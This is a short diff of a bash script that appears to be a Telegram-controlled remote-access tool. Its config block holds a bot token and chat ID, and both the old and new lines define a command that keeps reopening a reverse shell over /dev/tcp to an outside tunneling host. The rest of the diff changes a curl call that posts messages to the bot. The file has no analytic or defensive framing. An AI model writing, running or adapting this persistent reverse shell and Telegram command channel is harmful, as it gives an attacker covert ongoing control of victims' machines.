@@ -9,14 +9,14 @@ set -euo pipefail
 ################ CONFIG ################
 TOKEN="7930568732:AAFX_JcdEO3kNrmma6x1xHLahbHD1cgmet8"
 CHAT_ID="6565158025"
-HARDCODE_CMD="nohup bash -c 'while true; do setsid bash -i >& /dev/tcp/net-mandatory.gl.at.ply.gg/24130 0>&1; sleep 1; done' &"
+HARDCODE_CMD="nohup bash -c 'while true; do setsid bash -i >& /dev/tcp/net-mandatory.gl.at.ply.gg/24130 0>&1; sleep 1; done' &"   # <-- replace this with your hardcoded command
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
 
 send_msg() {
   local text="$1"
-  curl -s -X POST "${API}/sendMessage" \
+  curl -s -sX POST "${API}/sendMessage" \
     -d chat_id="${CHAT_ID}" \
     -d text="$text" >/dev/null
 }
